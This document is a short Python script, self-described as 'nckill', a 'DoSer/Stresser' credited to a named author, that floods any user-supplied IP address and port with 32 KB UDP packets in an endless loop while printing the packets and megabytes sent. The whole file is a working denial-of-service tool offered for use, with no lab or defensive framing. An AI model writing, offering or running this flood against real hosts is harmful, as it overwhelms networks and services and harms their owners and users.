'''
Programmed by hXR16F
hXR16F.ar@gmail.com

nckill - Network Card KILLer (DoSer/Stresser)
'''

import socket
import random

def main(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(32768)
    sent = 0
    total_bytes = 0
    print("")
    while 1:
        try:
            client.sendto(bytes, (target_ip, target_port))
            sent = sent + 1
            sent_formatted = str(sent)
            total_bytes = total_bytes + 32769 / 1048576
            total_bytes_formatted = round(total_bytes, 1)
            if sent_formatted.endswith("00"):
                print(f"Packets sent: {sent} [{total_bytes_formatted} MB]")
        except KeyboardInterrupt:
            print("\nSummary:")
            print(f"  Target: {target_ip}:{target_port}")
            print(f"  Total packets sent: {sent}, total megabytes sent: {total_bytes_formatted} MB.")
            exit()

if __name__ == '__main__':
    target_ip = input("IP address: ")
    target_port = int(input("Port: "))
    main(target_ip, target_port)